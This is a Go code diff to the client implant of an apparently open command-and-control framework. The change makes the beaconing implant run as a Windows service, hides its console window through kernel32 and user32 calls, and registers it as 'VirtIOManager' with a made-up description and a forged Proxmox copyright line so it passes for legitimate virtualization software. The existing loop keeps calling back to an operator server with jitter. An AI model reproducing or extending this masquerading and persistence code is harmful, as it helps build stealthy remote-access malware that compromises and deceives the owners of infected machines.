@@ -5,22 +5,48 @@ import (
 	"encoding/gob"
 	"fmt"
 	"log"
+	"syscall"
 	"time"
 
 	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/kardianos/service"
 )
 
 var (
-	ServerIP			string
-	ServerPort			string
-	CallbackFrequency	string
-	CallbackJitter		string
-	RootCert			string
+	ServerIP            string
+	ServerPort          string
+	CallbackFrequency   string
+	CallbackJitter      string
+	RootCert            string
 )
 
-func main() {
+type program struct{}
+
+func (p *program) Start(s service.Service) error {
+	go p.run()
+	return nil
+}
+
+func (p *program) Stop(s service.Service) error {
+	return nil
+}
+
+func HideConsoleWindow() {
+    kernel32 := syscall.NewLazyDLL("kernel32.dll")
+    user32 := syscall.NewLazyDLL("user32.dll")
+
+    getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
+    showWindow := user32.NewProc("ShowWindow")
+
+    hwnd, _, _ := getConsoleWindow.Call()
+    if hwnd != 0 {
+        showWindow.Call(hwnd, uintptr(0))
+    }
+}
+
+func (p *program) run() {
 	client_utils.Initialize()
 	config, err := client_utils.LoadCertificate(RootCert)
 	if err != nil {
@@ -52,6 +78,26 @@ func main() {
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
 		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
+	}
+}
+
+func main() {
+	HideConsoleWindow()
+	svcConfig := &service.Config{
+		Name:        "VirtIOManager",
+		DisplayName: "VirtIOManager",
+		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
+	}
+
+	prg := &program{}
+	s, err := service.New(prg, svcConfig)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = s.Run()
+	if err != nil {
+		log.Fatal(err)
 	}
 }
 
